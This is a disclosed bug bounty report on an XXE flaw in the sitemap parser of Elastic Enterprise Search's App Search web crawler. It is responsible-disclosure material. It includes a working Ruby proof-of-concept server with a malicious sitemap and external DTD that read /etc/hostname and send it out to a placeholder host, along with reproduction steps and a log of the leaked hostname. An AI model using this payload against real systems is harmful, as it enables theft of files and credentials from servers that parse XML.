# XXE in Enterprise Search's App Search web crawler

## Report Details
- **Report ID**: 1156748
- **URL**: https://hackerone.com/reports/1156748
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-04-08T04:42:57.058Z
- **Disclosed**: 2021-04-29T15:05:10.100Z

## Reporter
- **Username**: dee-see
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
## Summary

Hello team! The latest version of Enterprise Search (7.12.0) is vulnerable to XXE when [parsing sitemaps](https://www.elastic.co/guide/en/app-search/current/crawl-web-content.html#crawl-web-content-manage-sitemaps). Up to now I'm only able to read file that contain one line. I'm reporting now to avoid duplicates, but I'll keep working to find a way to extract entire files or HTTP request bodies.

## Description

Enterprise Search has a Web Crawler that crawls websites and ingests data to make it searchable. The crawler will look for `robots.txt` files and in that file it will look for the `sitemap` directive. When the sitemap is present, the crawler will parse it and crawl each pages that's listed there.

The code used to parse the site map is vulnerable to XXE. At the time of reporting I'm limited to exfiltrating only files that contain one line and admittedly this is very limiting, but I'm going to keep looking for ways to bypass this limitation. Once bypassed this has the potential to leak very sensitive data and credentials.

## Steps to reproduce

### Attacker Server

This is my attacker server, it's a ruby application that requires `sinatra` (`gem install sinatra`)

```ruby
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
end
```

Save that to a file and run it with `ruby server.rb`.


### Enterprise Search

1. Log in to Enterprise Search
1. Click `Launch App Search`
1. Click `Create an Engine`, give it any name and click `Create Engine`
1. Click `Use the Web Crawler`
1. Enter the domain hosting the XXE payload as the `Domain URL`
1. Click `Start a Crawl` and observe your server logs, you should see the hostname of the targetted machine

Running this on an Elastic Cloud instance I got this in my log.

```text
20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] "GET /exfil?d403d12993e0 HTTP/1.1" 404 459
```

Where `d403d12993e0` is the host name of the machine where my instance is running on. I could also reproduce using the on-premise version.

## Impact

At the moment I can read a limited number of files. If I can get around the one line limit I'll be able to read credentials and potentially AWS metadata.

## Attachments
No attachments
